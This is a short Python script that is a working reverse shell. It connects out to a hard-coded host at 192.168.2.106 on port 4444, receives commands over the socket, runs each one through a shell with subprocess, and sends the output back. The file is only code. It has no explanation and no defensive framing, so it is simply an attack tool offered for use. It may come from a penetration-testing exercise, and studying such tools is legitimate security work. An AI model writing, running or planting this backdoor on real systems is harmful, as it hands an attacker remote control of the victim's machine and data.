#!/usr/bin/python

import socket, subprocess

def execute_system_command(command):
    return subprocess.check_output(command, shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("192.168.2.106", 4444))
connection.send("[+] Connection established!")

while True:
    command = connection.recv(1024) # buffer size
    command_result = execute_system_command(command)
    connection.send(command_result)

connection.close()
